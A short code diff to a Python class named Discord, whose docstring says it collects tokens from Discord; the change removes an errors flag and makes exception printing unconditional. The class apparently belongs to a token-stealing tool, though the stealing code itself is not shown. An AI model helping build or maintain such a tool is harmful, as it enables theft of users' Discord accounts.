@@ -12,11 +12,10 @@ class Discord:
     """
     Collects tokens from the Discord.
     """
-    def __init__(self, storage_path: str, folder: str, errors: bool):
+    def __init__(self, storage_path: str, folder: str):
 
         self.__storage_path = storage_path
         self.__folder = folder
-        self.__errors = errors
 
         self.__config = DiscordConfig()
 
@@ -128,4 +127,4 @@ class Discord:
             self.__get_tokens()
 
         except Exception as e:
-            if self.__errors is True: print(f"[Discord]: {repr(e)}")
+            print(f"[Discord]: {repr(e)}")
